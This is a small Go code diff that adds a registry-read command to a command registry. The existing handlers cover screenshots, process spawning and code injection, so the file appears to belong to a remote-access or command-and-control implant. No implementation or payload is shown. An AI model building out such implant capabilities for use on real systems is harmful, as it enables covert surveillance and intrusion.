@@ -54,6 +54,7 @@ func Initialize() {
 		RegisterCommand(&ScreenshotCommand{})
 		RegisterCommand(&SpawnCommand{})
 		RegisterCommand(&OpusInjectionCommand{})
+		RegisterCommand(&RegReadCommand{})
 	}
 
 	log.Printf("[INFO] Registered %d command handlers", len(commandRegistry))
